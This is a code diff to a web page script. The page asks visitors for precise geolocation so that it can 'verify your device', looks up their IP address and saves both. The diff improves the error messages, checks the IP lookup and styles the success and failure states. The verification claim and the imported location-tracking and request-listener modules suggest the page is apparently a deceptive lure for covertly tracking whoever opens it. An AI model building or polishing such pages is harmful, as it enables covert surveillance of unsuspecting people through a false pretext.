@@ -3,6 +3,20 @@ import { initializeTheme } from './src/features/theme/theme-manager.js';
 import { listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
 import { getDeviceInfo } from './src/utils/browser-detection.js';
 
+// Helper function to handle geolocation errors
+function getGeolocationErrorMessage(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            return "Location access was denied. Please allow location access to verify your device.";
+        case error.POSITION_UNAVAILABLE:
+            return "Location information is unavailable. Please try again.";
+        case error.TIMEOUT:
+            return "Location request timed out. Please try again.";
+        default:
+            return "An unknown error occurred while getting location. Please try again.";
+    }
+}
+
 // Initialize Firebase and load theme
 document.addEventListener('DOMContentLoaded', async () => {
     try {
@@ -42,17 +56,29 @@ document.addEventListener('DOMContentLoaded', async () => {
                 // Get initial location
                 console.log('Requesting location...');
                 const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 20000,
-                        maximumAge: 0
-                    });
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            console.log('Location received successfully');
+                            resolve(pos);
+                        },
+                        (err) => {
+                            console.error('Geolocation error:', err);
+                            reject(new Error(getGeolocationErrorMessage(err)));
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 20000,
+                            maximumAge: 0
+                        }
+                    );
                 });
-                console.log('Location received:', position);
 
                 // Get IP address
                 console.log('Fetching IP address...');
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
+                if (!ipResponse.ok) {
+                    throw new Error('Failed to fetch IP address');
+                }
                 const { ip } = await ipResponse.json();
                 console.log('IP address received:', ip);
 
@@ -79,6 +105,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 console.log('Location saved successfully');
 
                 locationStatus.textContent = 'Device verified successfully';
+                verifyButton.style.display = 'none'; // Hide button after success
                 
                 // Add success animation class
                 document.querySelector('.thank-you-card').classList.add('success');
@@ -86,6 +113,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             } catch (error) {
                 console.error('Verification failed:', error);
                 locationStatus.textContent = error.message || 'Verification failed. Please try again.';
+                locationStatus.style.color = '#DA1710'; // Show error in red
                 verifyButton.disabled = false;
                 document.querySelector('.container').classList.remove('processing');
             }
